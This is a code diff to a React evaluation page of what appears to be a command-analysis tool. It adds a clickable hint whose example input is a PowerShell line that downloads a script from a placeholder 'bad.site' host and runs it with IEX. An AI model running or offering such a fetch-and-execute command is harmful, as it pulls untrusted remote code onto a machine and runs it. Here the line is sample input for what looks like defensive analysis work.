@@ -6,7 +6,7 @@ import { useAnalysisEvent } from "../contexts/AnalysisEventContext";
 import { useIpAddress } from "../../hooks/useIpAddress";
 import { useRateLimit } from "../../hooks/useRateLimit";
 import LoadingSpinner from "../components/LoadingSpinner";
-import { ErrorMessage } from "../components/Messages";
+import { ErrorMessage, InfoMessage } from "../components/Messages";
 import CommandInput from "../components/CommandInput";
 import ThemedButton from "../components/ThemedButton";
 import AnalysisChat from "../components/AnalysisChat";
@@ -314,6 +314,12 @@ export default function EvaluatePage() {
               </div>
             </div>
           )}
+
+          <InfoMessage 
+            message={!error && command.trim() === "" ? "Example: IEX(New-Object Net.WebClient).DownloadString('http://bad.site/payload.ps1')" : ""}
+            clickable={!error && command.trim() === ""}
+            onClick={() => setCommand("IEX(New-Object Net.WebClient).DownloadString('http://bad.site/payload.ps1')")}
+          />
         </form>
         </div>
       </div>
